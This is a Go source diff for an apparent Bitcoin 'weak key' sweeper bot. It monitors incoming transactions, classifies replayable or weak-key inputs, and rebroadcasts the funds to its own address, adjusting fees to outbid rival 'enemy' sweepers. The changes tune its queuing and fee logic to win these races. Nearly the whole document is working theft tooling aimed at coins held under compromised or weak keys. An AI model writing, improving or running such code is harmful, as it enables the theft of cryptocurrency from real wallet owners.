@@ -38,6 +38,9 @@ type Spender struct {
 	addressOrder map[float64]string
 	secretStore  grabber.MemorySecretStore
 
+	transMu          sync.RWMutex
+	seenTransactions []*wire.MsgTx
+
 	feeMu sync.RWMutex
 	fee   mempoolspace.Fee
 }
@@ -225,12 +228,43 @@ func (s *Spender) Start(ctx context.Context) {
 		s.fee = *f
 		s.feeMu.Unlock()
 	}
+
+	go func() {
+		ticker := time.NewTicker(500 * time.Microsecond)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-ticker.C:
+			}
+
+			s.transMu.RLock()
+			size := len(s.seenTransactions)
+			items := make([]*wire.MsgTx, 0, size)
+			items = append(items, s.seenTransactions...)
+			s.transMu.RUnlock()
+			if size == 0 {
+				continue
+			}
+
+			for _, tx := range items {
+				s.onTx(ctx, tx)
+			}
+
+			s.transMu.Lock()
+			s.seenTransactions = s.seenTransactions[size:]
+			s.transMu.Unlock()
+		}
+	}()
+
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		case tx := <-s.txChan:
-			go s.onTx(ctx, tx)
+			s.transMu.Lock()
+			s.seenTransactions = append(s.seenTransactions, tx)
+			s.transMu.Unlock()
 		case <-t.C:
 			go func() {
 				fee, err := s.cli.GetFee(ctx)
@@ -249,10 +283,15 @@ func (s *Spender) Start(ctx context.Context) {
 const minSats = 800
 
 func (s *Spender) onTx(ctx context.Context, tx *wire.MsgTx) {
+	//start := time.Now()
 	defer func() {
 		if r := recover(); r != nil {
-			s.logger.Info("ruh oh a panic occurred")
+			s.logger.Error("ruh oh a panic occurred")
 		}
+		//s.logger.Info("tx processed",
+		//	zap.String("txid", tx.TxHash().String()),
+		//	zap.Duration("in", time.Since(start)),
+		//)
 	}()
 	switch s.classifyTx(tx) {
 	case ReplayableSimpleInput:
@@ -323,6 +362,7 @@ func (s *Spender) spendWeakKey(ctx context.Context, weakTx *wire.MsgTx, enemy ..
 			if found {
 				if hmm.IsWeak {
 					weakTx = hmm.MsgTx
+					hash = weakTx.TxHash()
 				} else {
 					enemyTx = hmm.MsgTx
 					goto retry
@@ -373,9 +413,11 @@ outLoop:
 	}
 
 	// bump the fee on the transaction by 2 sats per byte
-	var bumpMultiplier int64 = 250
+	var bumpMultiplier int64 = 2
 
-	originalTotal := totalValue
+	if isEnemy {
+		totalValue = enemyVal - (int64(enemySize) * 10)
+	}
 	output := wire.NewTxOut(totalValue, s.addressScript)
 	tx.AddTxOut(output)
 
@@ -388,15 +430,15 @@ outLoop:
 	}
 
 	totalValue += -int64(txhelper.VBytes(tx) * float64(bumpMultiplier))
-	if isEnemy {
-		enemyFee := originalTotal - enemyVal
-		s.logger.Info("enemy fee detected", zap.String("fee", btcutil.Amount(enemyFee).String()))
-		totalValue += -enemyFee
-
-		//totalValue += -int64(txhelper.VBytes(tx) * float64(10))
-		_ = enemySize
-		//totalValue += -int64(enemySize * 2)
-	}
+	//if isEnemy {
+	//	enemyFee := originalTotal - enemyVal
+	//	s.logger.Info("enemy fee detected", zap.String("fee", btcutil.Amount(enemyFee).String()))
+	//	totalValue += -enemyFee
+	//
+	//	//totalValue += -int64(txhelper.VBytes(tx) * float64(10))
+	//	_ = enemySize
+	//	//totalValue += -int64(enemySize * 2)
+	//}
 	// if after fees we're spending too much ... ignore
 	if totalValue <= minSats {
 		s.logger.Warn("skipping weak key .. final sats lowers than threshold",
